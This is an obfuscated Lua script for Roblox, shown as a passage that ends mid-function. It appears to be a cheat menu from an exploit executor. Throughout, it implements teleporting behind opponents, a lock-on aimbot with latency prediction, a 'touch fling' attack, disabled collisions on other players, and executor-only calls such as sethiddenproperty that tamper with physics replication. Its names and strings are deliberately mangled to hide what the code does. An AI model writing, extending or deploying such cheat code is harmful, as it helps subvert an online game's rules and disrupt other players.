 local function _IlllIllIll(exceptActive, animIdFilter) local _lllIIllIll = not exceptActive and _lIlIIIIlII(_llIlIIlIll) if _lllIIllIll then _lllIIllIll = _IIIlIIIIll(_lIlIIIIlII(_llIlIIlIll)) end
 if _lllIIllIll then if animIdFilter then for _lIIlIllIlI, stopTrack in pairs(_lllIIllIll:GetPlayingAnimationTracks()) do if typeof(animIdFilter) ~= "\116\097\098\108\101" then if stopTrack.Animation.AnimationId:match(tostring(animIdFilter):match("\037\100\043")) then stopTrack:Stop() end
 else for _lIIlIllIlI, stopAnimId in pairs(animIdFilter) do if stopTrack.Animation.AnimationId:match(tostring(stopAnimId):match("\037\100\043")) then stopTrack:Stop() end
 end
 end
 end
 else for _lIIlIllIlI, stopTrack2 in pairs(_lllIIllIll:GetPlayingAnimationTracks()) do stopTrack2:Stop() end
 end
 end
 end
 local function _IlIlIIIIll() local _lllIlIllIl = _lIlIIIIlII(_llIlIIlIll) if not _lllIlIllIl then return nil end
 _lllIlIllIl = _lllIlIllIl:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0x1) return _lllIlIllIl end
 local function _IllIIIIIlI(eventData) local _llIIlllIlI = _IlIlIIIIll() if _llIIlllIlI then _llIIlllIlI:FireServer(eventData) end
 end
 local function _IIllIlllll(instance, newInstance) task.wait() local _llllIlllll = instance.Parent instance:Destroy() if newInstance then warn("\073\110\115\116\097\110\099\101\032\114\101\109\111\118\101\100\044\032\078\097\109\101\058", instance.Name, "\067\108\097\115\115\078\097\109\101\058", instance.ClassName, "\080\097\114\101\110\116\058", _llllIlllll) end
 end
 local function _lIlllIllll(_IllIIllllI) local _IlllllIIII = (typeof(_IllIIllllI) == "\073\110\115\116\097\110\099\101" and _IllIIllllI:IsA("\077\111\100\101\108")) and _IllIIllllI or _lIlIIIIlII(_IllIIllllI) local _IIIlIIllll = _IlllllIIII and _lIlIlIIlII(_IlllllIIII) or _IlllllIIII return _IlllllIIII and _IIIlIIllll and _IIIlIIllll.Velocity.Magnitude >= 0x7D0 and true or false end
 local function _IllIllIlll(excludeFF, maxDist) local _IlIlllIIlI = _lIlIIIIlII(_llIlIIlIll) local _llIIllIlll = _IlIlllIIlI and _lIlIlIIlII(_IlIlllIIlI) or _IlIlllIIlI local _IIIlIIlIlI = nil if _IlIlllIIlI and _llIIllIlll then local _IIIIIlIIIl = math.huge local _llIlllIlII = {} for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do table.insert(_llIlllIlII, _lIIlIIlllI) end
 local _lIIlIIIIIl = workspace:FindFirstChild("\076\105\118\101") if _lIIlIIIIIl then for _lIIlIllIlI, _IllIIIllII in ipairs(_lIIlIIIIIl:GetChildren()) do if _IllIIIllII:IsA("\077\111\100\101\108") and _IllIIIllII:FindFirstChild("\072\117\109\097\110\111\105\100") then table.insert(_llIlllIlII, _IllIIIllII) end
 end
 end
 for _lIIlIllIlI, mouseTPPlayer in ipairs(_llIlllIlII) do local _lllIllIIIl = (mouseTPPlayer == _llIlIIlIll) or (typeof(mouseTPPlayer) == "\073\110\115\116\097\110\099\101" and mouseTPPlayer:IsA("\077\111\100\101\108") and mouseTPPlayer == _llIlIIlIll.Character) local _IlllllIIII = (typeof(mouseTPPlayer) == "\073\110\115\116\097\110\099\101" and mouseTPPlayer:IsA("\077\111\100\101\108")) and mouseTPPlayer or _lIlIIIIlII(mouseTPPlayer) if not _lllIllIIIl and _IlllllIIII then local _IIlIIlllll = _IlllllIIII local _lllllIllll = _IIlIIlllll and _lIlIlIIlII(_IIlIIlllll) or _IIlIIlllll local _lllllIlIlI = _IIlIIlllll and _IIIlIIIIll(_IIlIIlllll) or _IIlIIlllll if _IIlIIlllll and _lllllIllll and _lllllIlIlI and _lllllIlIlI.Health ~= 0x0 and workspace.CurrentCamera then local _IIIlIlllIl = nil if excludeFF then local _IllIIlllIl = workspace.CurrentCamera:WorldToViewportPoint(_lllllIllll.Position) _IIIlIlllIl = (Vector2.new(_IllIIlllIl.X, _IllIIlllIl.Y) - _IlllIIllII:GetMouseLocation()).Magnitude else _IIIlIlllIl = (_llIIllIlll.Position - _lllllIllll.Position).Magnitude end
 if _IIIlIlllIl < _IIIIIlIIIl then if maxDist then if not _lIlllIllll(mouseTPPlayer) then _IIIIIlIIIl = _IIIlIlllIl _IIIlIIlIlI = mouseTPPlayer end
 else _IIIIIlIIIl = _IIIlIlllIl _IIIlIIlIlI = mouseTPPlayer end
 end
 end
 end
 end
 end
 return _IIIlIIlIlI end
 local function _lIllllIlll() local _IlllllIIlI, bestStreakPlayer = 0x0, nil for _lIIlIllIlI, streakPlayer in pairs(Players:GetPlayers()) do local _llllIIIlII = _lIlIIIIlII(streakPlayer) local _IIIIllIIIl = _llllIIIlII and (_llllIIIlII:GetAttribute("\067\117\114\114\101\110\116\083\116\114\101\097\107") or 0x0) or 0x0 if _llllIIIlII and _IlllllIIlI < _IIIIllIIIl then bestStreakPlayer = streakPlayer _IlllllIIlI = _IIIIllIIIl end
 end
 return bestStreakPlayer end
 local _lIllllIllI = _llllIIlllI _lIllllIllI:AddToggle("\065\110\105\109\101\084\101\108\101\112\111\114\116\097\116\105\111\110", { Text = "\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110", Default = false, Callback = function (_IIlIlIIlII) end
 , }) _lIllllIllI:AddLabel("\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110\032\075\101\121\098\105\110\100"):AddKeyPicker("\065\110\105\109\101\084\080\075\101\121\098\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\084", Text = "\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110", Callback = function () _lIIlIllIlI.AnimeTPKeybind.Toggled = false if not _llIIllIlll.AnimeTeleportation or not _llIIllIlll.AnimeTeleportation.Value then return end
 local _lllIlllllI = _lIlIIIIlII(_llIlIIlIll) local _IIllIIllIl = _lllIlllllI and _lIlIlIIlII(_lllIlllllI) or _lllIlllllI local _IlIlIlllII = _lllIlllllI and _IIIlIIIIll(_lllIlllllI) or _lllIlllllI if not (_lllIlllllI and _IIllIIllIl and _IlIlIlllII) then return end
 local _lIIIllIlll = getgenv()._revenantTPMode or (_lIIlIllIlI.AnimeTPMode and _lIIlIllIlI.AnimeTPMode.Value) or "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101" local _lIIIIIIIlI = nil if _lIIIllIlll == "\083\105\108\101\110\116\032\076\111\099\107" then local _lllIlllllI, closestDist = nil, math.huge for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then local _lIIIIIlIll = _lIIlIIlllI.Character local _IlIIIlIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIIlIIIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIIIIIlIll and _IlIIIlIIlI and _lIIlIIIIlI and _lIIlIIIIlI.Health > 0x0 then local _IllIIlllIl, onScreen = workspace.CurrentCamera:WorldToViewportPoint(_IlIIIlIIlI.Position) if onScreen then local _lIIllIIlll = _IlllIIllII:GetMouseLocation() local _lllIIllIII = (Vector2.new(_IllIIlllIl.X, _IllIIlllIl.Y) - _lIIllIIlll).Magnitude if _lllIIllIII < closestDist then closestDist = _lllIIllIII _lllIlllllI = _IlIIIlIIlI end
 end
 end
 end
 end
 if _lllIlllllI then _lIIIIIIIlI = CFrame.new(_lllIlllllI.CFrame.Position - _lllIlllllI.CFrame.LookVector * 0x5, _lllIlllllI.CFrame.Position) end
 else if _llIlIlIIlI.Target then local _IlIIlIllII = _IIllIIllIl.CFrame _lIIIIIIIlI = CFrame.new( _llIlIlIIlI.Hit.Position, Vector3.new(_IlIIlIllII.Position.X, _llIlIlIIlI.Hit.Position.Y, _IlIIlIllII.Position.Z) ) * CFrame.Angles(0x0, math.pi, 0x0) end
 end
 if not _lIIIIIIIlI then return end
 _IlllIllIll(_IlIlIlllII, {"\049\053\057\053\055\051\054\049\051\051\057"}) if _llIIllIlll.AnimeTPAnimation.Value then local _lIIlIIIIIl = _lllllIIlll(_IlIlIlllII, "\049\053\057\053\055\051\054\049\051\051\057") _lIIlIIIIIl.Priority = Enum.AnimationPriority.Action2 _lIIlIIIIIl:Play() _lIIlIIIIIl:AdjustSpeed(_lIIlIllIlI.AnimeTPSpeed.Value) end
 _IIlllIIlIl(_lIIIIIIIlI) local _IIIIlIlIll = _lIIlIllIlI.AnimeTPSound.Value if _IIIIlIlIll == "\071\111\107\117" then local _IllIIIlllI = _lIlIlIllll(_IIllIIllIl, "\052\056\054\049\054\051\056\057\056\050") _IllIIIlllI.Volume = _lIIlIllIlI.AnimeTPVolume.Value / 0xA _IllIIIlllI:Play() elseif _IIIIlIlIll == "\071\111\107\117\032\066\108\097\099\107" then local _lIlllIlIIl = _lIlIlIllll(_IIllIIllIl, "\057\048\049\048\050\050\049\056\052\056") _lIlllIlIIl.Volume = _lIIlIllIlI.AnimeTPVolume.Value / 0xA _lIlllIlIIl:Play() _lIlllIlIIl.TimePosition = 0.4 end
 pcall( function () local _IIlIllIlIl = _IlllIlIIlI.Resources.KJEffects.tpthing:Clone() _IIlIllIlIl.Parent = _IIllIIllIl _IIlIllIlIl:Emit(0xF) _lllIIlIlll:AddItem(_IIlIllIlIl, 0x1) end
 ) for _lIIlIllIlI, _IllIllllll in pairs(_lllIlllllI:GetDescendants()) do if _IllIllllll:IsA("\066\097\115\101\080\097\114\116") and _IllIllllll ~= _IIllIIllIl and _IllIllllll.Transparency ~= 0x1 and not _IllIllllll.Name:lower():find("\104\105\116\098\111\120") then task.spawn( function () _IllIllllll.Transparency = 0x1 task.delay(0.1, function () if getgenv().desync and not _lllIlllllI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then _IllIllllll.Transparency = 0.5 else _IllIllllll.Transparency = 0x0 end
 end
 ) local _IIlllllIII = _IllIllllll:FindFirstChildWhichIsA("\068\101\099\097\108") if _IIlllllIII and _IIlllllIII.Transparency ~= 0x1 then local _IIIlIlllIl = _IIlllllIII.Transparency _IIlllllIII.Transparency = 0x1 task.wait(0.1) _IIlllllIII.Transparency = _IIIlIlllIl end
 end
 ) end
 end
 end
 , }) _lIllllIllI:AddToggle("\065\110\105\109\101\084\080\065\110\105\109\097\116\105\111\110", { Text = "\084\101\108\101\112\111\114\116\032\065\110\105\109\097\116\105\111\110", Default = false, }) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.AnimeTeleportation:SetValue(false) end
 ) pcall( function () _llIIllIlll.AnimeTPAnimation:SetValue(false) end
 ) pcall( function () _llIIllIlll.TP1:SetValue(false) end
 ) pcall( function () _llIIllIlll.TP2:SetValue(false) end
 ) end
 ) _lIllllIllI:AddDropdown("\065\110\105\109\101\084\080\083\111\117\110\100", { Values = {"\078\111\110\101", "\071\111\107\117", "\071\111\107\117\032\066\108\097\099\107"}, Default = 0x1, Multi = false, Text = "\084\101\108\101\112\111\114\116\032\083\111\117\110\100", }) _lIllllIllI:AddSlider("\065\110\105\109\101\084\080\086\111\108\117\109\101", { Text = "\083\111\117\110\100\032\086\111\108\117\109\101", Default = 0xA, Min = 0x1, Max = 0xA, Rounding = 0x1, }) _lIllllIllI:AddSlider("\065\110\105\109\101\084\080\083\112\101\101\100", { Text = "\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0.5, Max = 0x5, Rounding = 0x1, }) if not (_IlllIIllII.TouchEnabled and not _IlllIIllII.KeyboardEnabled) then _lIllllIllI:AddDropdown("\065\110\105\109\101\084\080\077\111\100\101", { Text = "\084\080\032\077\111\100\101", Values = { "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101", "\083\105\108\101\110\116\032\076\111\099\107" }, Default = 0x1, Multi = false, Callback = function (_IIlIlIIlII) getgenv()._revenantTPMode = _IIlIlIIlII end
 , }) _lIllllIllI:AddLabel("\080\114\101\115\115\032\070\051\032\116\111\032\113\117\105\099\107\108\121\032\115\119\105\116\099\104\032\098\101\116\119\101\101\110\032\116\101\108\101\112\111\114\116\032\109\111\100\101\115\046", true) _IlIllIlIIl[#_IlIllIlIIl+0x1] = _IlllIIllII.InputBegan:Connect( function (input, gp) if gp then return end
 if input.KeyCode == Enum.KeyCode.F3 then local _IlIlllllIl = _lIIlIllIlI.AnimeTPMode and _lIIlIllIlI.AnimeTPMode.Value if _IlIlllllIl == "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101" then getgenv()._revenantTPMode = "\083\105\108\101\110\116\032\076\111\099\107" pcall( function () _lIIlIllIlI.AnimeTPMode:SetValue("\083\105\108\101\110\116\032\076\111\099\107") end
 ) _IIIllIIlll:Notify({ Title = "\065\110\105\109\101\032\084\080", Content = "\077\111\100\101\058\032\083\105\108\101\110\116\032\076\111\099\107", _IlllIlIllI = 0x2 }) else getgenv()._revenantTPMode = "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101" pcall( function () _lIIlIllIlI.AnimeTPMode:SetValue("\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101") end
 ) _IIIllIIlll:Notify({ Title = "\065\110\105\109\101\032\084\080", Content = "\077\111\100\101\058\032\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101", _IlllIlIllI = 0x2 }) end
 end
 end
 ) end
 if _IlllIIllII.TouchEnabled and not _IlllIIllII.KeyboardEnabled then _lIllllIllI:AddButton({ Text = "\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110", Func = function () local _IlIIIllIIl = _llIlIIlIll.Character local _llIllIIIII = _IlIIIllIIl and _IlIIIllIIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIlIIlIIll = _IlIIIllIIl and _IlIIIllIIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IlIIIllIIl and _llIllIIIII and _lIlIIlIIll) then return end
 local _lllIlllllI, closestDist = nil, math.huge local _llllllIlll = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 0x2, workspace.CurrentCamera.ViewportSize.Y / 0x2) for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then local _lIIIIIlIll = _lIIlIIlllI.Character local _IlIIIlIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIIlIIIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIIIIIlIll and _IlIIIlIIlI and _lIIlIIIIlI and _lIIlIIIIlI.Health > 0x0 then local _IllIIlllIl, onScreen = workspace.CurrentCamera:WorldToViewportPoint(_IlIIIlIIlI.Position) if onScreen then local _lllIIllIII = (Vector2.new(_IllIIlllIl.X, _IllIIlllIl.Y) - _llllllIlll).Magnitude if _lllIIllIII < closestDist then closestDist = _lllIIllIII _lllIlllllI = _IlIIIlIIlI end
 end
 end
 end
 end
 if _lllIlllllI then _IlllIllIll(_lIlIIlIIll, {"\049\053\057\053\055\051\054\049\051\051\057"}) if _llIIllIlll.AnimeTPAnimation.Value then local _lIIIllllII = _lllllIIlll(_lIlIIlIIll, "\049\053\057\053\055\051\054\049\051\051\057") _lIIIllllII.Priority = Enum.AnimationPriority.Action2 _lIIIllllII:Play() _lIIIllllII:AdjustSpeed(_lIIlIllIlI.AnimeTPSpeed.Value) end
 local _lIIIIIIIlI = CFrame.new(_lllIlllllI.CFrame.Position - _lllIlllllI.CFrame.LookVector * 0x5, _lllIlllllI.CFrame.Position) _IIlllIIlIl(_lIIIIIIIlI) end
 end
 , }) end
 _lIllllIllI:AddToggle("\076\111\099\107\045\111\110", { Text = "\076\111\099\107\045\111\110", Default = false, Callback = function (lockOnVal) if not lockOnVal then if _lIIlIllIlI["\076\045\079\110\075\101\121\098\105\110\100"]:GetState() == true then _lIIlIllIlI["\076\045\079\110\075\101\121\098\105\110\100"].Toggled = false _lIIlIllIlI["\076\045\079\110\075\101\121\098\105\110\100"]:DoClick() else _lIIlIllIlI["\076\045\079\110\075\101\121\098\105\110\100"].Toggled = false end
 end
 end
 , }):AddKeyPicker("\076\045\079\110\075\101\121\098\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\086", Text = "\076\111\099\107\045\111\110", Callback = function (lockOnRangeVal) if _IllllIlIII["\076\111\099\107\045\111\110"] then return end
 if lockOnRangeVal and not _llIIllIlll["\076\111\099\107\045\111\110"].Value then RunService.RenderStepped:Wait() _IllllIlIII["\076\111\099\107\045\111\110"] = true _lIIlIllIlI["\076\045\079\110\075\101\121\098\105\110\100"].Toggled = false _lIIlIllIlI["\076\045\079\110\075\101\121\098\105\110\100"]:DoClick() _IllllIlIII["\076\111\099\107\045\111\110"] = false return end
 local _llIIllllll = _IllIllIlll(true) if _llIIllllll and lockOnRangeVal and _llIIllIlll["\076\111\099\107\045\111\110"].Value then while true do local _IllllIIlll = _lIlIIIIlII(_llIlIIlIll) local _lIIlIIIIlI = _IllllIIlll and _lIlIlIIlII(_IllllIIlll) or _IllllIIlll local _llllllIlII = _IllllIIlll and _IIIlIIIIll(_IllllIIlll) or _IllllIIlll local _lllllllIIl = _llIIllllll and _lIlIIIIlII(_llIIllllll) or _llIIllllll local _llllIIIlll = _lllllllIIl and _lIlIlIIlII(_lllllllIIl) or _lllllllIIl local _IlIllllIlI = _lllllllIIl and _IIIlIIIIll(_lllllllIIl) or _lllllllIIl if _IllllIIlll and _lIIlIIIIlI and _llllllIlII and _llIIllllll and _lllllllIIl and _llllIIIlll and _IlIllllIlI and _llllllIlII.Health > 0x0 then _llllllIlII.AutoRotate = false local _IIllIlIIIl = _lllllllIIl:FindFirstChildWhichIsA("\072\105\103\104\108\105\103\104\116") or Instance.new("\072\105\103\104\108\105\103\104\116", _lllllllIIl) _IIllIlIIIl.FillTransparency = 0.8 _IIllIlIIIl.OutlineTransparency = 0x0 _IIllIlIIIl.DepthMode = "\065\108\119\097\121\115\079\110\084\111\112" _IIllIlIIIl.FillColor = Color3.fromRGB(0xFF, 0x0, 0x0) _IIllIlIIIl.OutlineColor = Color3.fromRGB(0xFF, 0x0, 0x0) local _IIllIIllII = _lIIlIIIIlI.Position local _IIlIIIllll = _llllIIIlll.Position local _llIIIIlIll = _llIIllIlll["\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value and _IIIlIlIIIl.Network.ServerStatsItem["\068\097\116\097\032\080\105\110\103"]:GetValue() / 0x3E8 or _lIIlIllIlI["\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value and _IIIlIlIIIl.Network.ServerStatsItem["\068\097\116\097\032\080\105\110\103"]:GetValue() / 0x3E8 or _lIIlIllIlI["\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value local _lIlIIlllII = Vector3.new(_IIlIIIllll.X, _lIIIllIlIl.Flying and _IIlIIIllll.Y or _IIllIIllII.Y, _IIlIIIllll.Z) + _IlIllllIlI.MoveDirection * _llllIIIlll.Velocity.Magnitude * 0.1 if _llIIllIlll["\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value then _lIIlIllIlI["\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"]:SetValue(tonumber(string.format("\037\046\049\102", _llIIIIlIll))) end
 if not _IllllIIlll:FindFirstChild("\082\097\103\100\111\108\108") then _lIIlIIIIlI.CFrame = CFrame.new(_IIllIIllII, _lIlIIlllII) end
 end
 RunService.RenderStepped:Wait() if _lIIlIllIlI["\076\045\079\110\075\101\121\098\105\110\100"]:GetState() == false or (_llIIllllll and not _llIIllllll.Parent) or not _llIIllllll then local _IIllIllIII = _lIlIIIIlII(_llIlIIlIll) local _llllIlIlIl = _IIllIllIII and _lIlIlIIlII(_IIllIllIII) or _IIllIllIII local _lIIlIIIIIl = _IIllIllIII and _IIIlIIIIll(_IIllIllIII) or _IIllIllIII if _IIllIllIII and _llllIlIlIl and _lIIlIIIIIl then _lIIlIIIIIl.AutoRotate = true end
 local _IllllllIIl = _llIIllllll and _lIlIIIIlII(_llIIllllll) or _llIIllllll local _lllIlIllIl = _IllllllIIl and _IllllllIIl:FindFirstChildWhichIsA("\072\105\103\104\108\105\103\104\116") or _IllllllIIl if _llIIllllll and _IllllllIIl and _lllIlIllIl then if _lIllllIlll() ~= _llIIllllll or (0xA > (_IllllllIIl:GetAttribute("\067\117\114\114\101\110\116\083\116\114\101\097\107") or 0x0) or _llIIllllll:GetAttribute("\083\095\072\105\100\101\083\116\114\101\097\107")) then _lllIlIllIl.FillTransparency = 0x1 _lllIlIllIl.OutlineTransparency = 0x1 _lllIlIllIl.DepthMode = "\079\099\099\108\117\100\101\100" _lllIlIllIl.FillColor = Color3.fromRGB(0xFF, 0xFF, 0xFF) _lllIlIllIl.OutlineColor = Color3.fromRGB(0xFF, 0xFF, 0xFF) else _lllIlIllIl.FillTransparency = 0x1 _lllIlIllIl.OutlineTransparency = 0x0 _lllIlIllIl.DepthMode = "\079\099\099\108\117\100\101\100" _lllIlIllIl.FillColor = Color3.fromRGB(0xFF, 0xFF, 0x0) _lllIlIllIl.OutlineColor = Color3.fromRGB(0xFF, 0xFF, 0x0) end
 end
 break end
 end
 else return end
 end
 , }) _lIllllIllI:AddSlider("\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110", { Text = "\080\114\101\100\105\099\116\105\111\110", Default = 0.1, Min = 0.1, Max = 0x1, Rounding = 0x1, Compact = true, }) _lIllllIllI:AddToggle("\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110", { Text = "\065\117\116\111\032\080\114\101\100\105\099\116\105\111\110", Default = false, }) _lIllllIllI:AddDivider() local _llIIllIIII = {} local _llIIlIIlIl = nil local function _lIlllIlllI(_IIllIIlllI) if not _IIllIIlllI then return end
 for _lIIlIllIlI, _IllllllIIl in pairs(_IIllIIlllI:GetDescendants()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then _IllllllIIl.CanCollide = false end
 end
 end
 _IlIlIlllll = function () for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then _llIIllIIII[_lIIlIIlllI] = _lIIlIIlllI.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _lIlllIlllI(_IIllIIlllI) end
 ) end
 end
 _llIIllIIII["\095\097\100\100\101\100"] = Players.PlayerAdded:Connect( function (_lIIlIIlllI) task.wait(0.1) _llIIllIIII[_lIIlIIlllI] = _lIIlIIlllI.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _lIlllIlllI(_IIllIIlllI) end
 ) end
 ) _llIIlIIlIl = RunService.Heartbeat:Connect( function () for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll and _lIIlIIlllI.Character then for _lIIlIllIlI, _IllllllIIl in pairs(_lIIlIIlllI.Character:GetDescendants()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") and _IllllllIIl.CanCollide then _IllllllIIl.CanCollide = false end
 end
 end
 end
 end
 ) end
 _lIIIlIlIlI = function () if _llIIlIIlIl then _llIIlIIlIl:Disconnect() _llIIlIIlIl = nil end
 for _lIIlIllIlI, _IllIIlIllI in pairs(_llIIllIIII) do pcall( function () _IllIIlIllI:Disconnect() end
 ) end
 table.clear(_llIIllIIII) for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll and _lIIlIIlllI.Character then for _lIIlIllIlI, _IllllllIIl in pairs(_lIIlIIlllI.Character:GetDescendants()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then _IllllllIIl.CanCollide = true end
 end
 end
 end
 end
 local _llIIIIlllI = nil local _lIIlIllIlI = nil local _IllIlIIIII = nil _llllIIlllI:AddToggle("\084\111\117\099\104\070\108\105\110\103\069\110\097\098\108\101\100", { Text = "\084\111\117\099\104\032\070\108\105\110\103", Tooltip = "\066\101\116\116\101\114\032\119\105\116\104\032\065\110\116\105\045\070\108\105\110\103", Default = false, Callback = function (_IIlIlIIlII) if getgenv()._revenantRaknetActive then getgenv()._raknetSavedTF = _IIlIlIIlII return end
 if not _IIlIlIIlII then _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] = false if _llIIIIlllI then pcall(_llIIIIlllI) end
 if _lIIlIllIlI then pcall( function () _lIIlIllIlI:Disconnect() end
 ) _lIIlIllIlI = nil end
 if _lIIlIllIlI.TouchFlingBind:GetState() == true then _lIIlIllIlI.TouchFlingBind.Toggled = false _lIIlIllIlI.TouchFlingBind:DoClick() end
 else if _IllIlIIIII and not _lIIlIllIlI then pcall(_IllIlIIIII) end
 end
 end
 , }):AddKeyPicker("\084\111\117\099\104\070\108\105\110\103\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\088", Text = "\084\111\117\099\104\032\070\108\105\110\103", Callback = function (_lIIlIIlllI) if _IlIlllllIl.TF then return end
 if _lIIlIIlllI and not _llIIllIlll.TouchFlingEnabled.Value then RunService.RenderStepped:Wait() _IlIlllllIl.TF = true; _lIIlIllIlI.TouchFlingBind.Toggled = false; _lIIlIllIlI.TouchFlingBind:DoClick(); _IlIlllllIl.TF = false return end
 if getgenv()._revenantRaknetActive then getgenv()._raknetSavedTF = _lIIlIIlllI _IIIllIIlll:Notify({ Title = "\084\111\117\099\104\032\070\108\105\110\103", Content = _lIIlIIlllI and "\084\111\103\103\108\101\100\032\111\110\032\9989" or "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IlllIlIllI = 0x2 }) return end
 if _llIIllIlll.TouchFlingEnabled.Value then _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] = _lIIlIIlllI if not _lIIlIIlllI and _llIIIIlllI then pcall(_llIIIIlllI) end
 _IIIllIIlll:Notify({ Title = "\084\111\117\099\104\032\070\108\105\110\103", Content = _lIIlIIlllI and "\084\111\103\103\108\101\100\032\111\110\032\9989" or "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IlllIlIllI = 0x2 }) end
 end
 , }) local function _lllllIllII(visible) for _lIIlIllIlI, key in ipairs({"\084\111\117\099\104\070\108\105\110\103\088","\084\111\117\099\104\070\108\105\110\103\089","\084\111\117\099\104\070\108\105\110\103\090","\084\111\117\099\104\070\108\105\110\103\088\073\110\112\117\116","\084\111\117\099\104\070\108\105\110\103\089\073\110\112\117\116","\084\111\117\099\104\070\108\105\110\103\090\073\110\112\117\116"}) do pcall( function () if _lIIlIllIlI[key] and _lIIlIllIlI[key].SetVisible then _lIIlIllIlI[key]:SetVisible(visible) end
 end
 ) end
 end
 local _lIIIIIlIII = _IlllIlIlII _llllIIlllI:AddDropdown("\084\111\117\099\104\070\108\105\110\103\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = { "\078\111\114\109\097\108" , "\068\101\097\116\104"}, Default = 0x1, Multi = false, Callback = function (_IIlIlIIlII) _lllllIllII(_IIlIlIIlII == "\078\111\114\109\097\108") end
 , }) do local _IlIIllllII = 0x4 local _lIllIIIllI = false local _lllIlllIII = nil local function _lllIlIIIll(_IIllIIlllI) if _lIllIIIllI then return end
 if _lllIlllIII then pcall( function () _lllIlllIII:Disconnect() end
 ) _lllIlllIII = nil end
 local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII then return end
 _lllIlllIII = _lIlIIllIII.Died:Connect( function () pcall( function () _lllIlllIII:Disconnect() end
 ) _lllIlllIII = nil local _IlIlIlIlIl = _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] = true task.wait(0.5) _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] = _IlIlIlIlIl end
 ) end
 _lllIlIIIll(_llIlIIlIll.Character) _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) _lIllIIIllI = true end
 ) local _lIIlIlIIlI = nil local _lllIlllllI = nil local _IIIIIllIlI = false local function _IlIIIllIIl() local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIlIllIlIl = _lllIlllllI _IIIIIllIlI = false _lllIlllllI = nil if _IIIlIIIIIl and not _IllIIlIllI then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _lIIlIlIIlI then pcall( function () sethiddenproperty(_lIIlIlIIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIIlIlIIlI.Anchored = true end
 ) pcall( function () _lIIlIlIIlI.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIIlIlIIlI.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _lIIlIlIIlI.Velocity = Vector3.zero end
 ) pcall( function () _lIIlIlIIlI.RotVelocity = Vector3.zero end
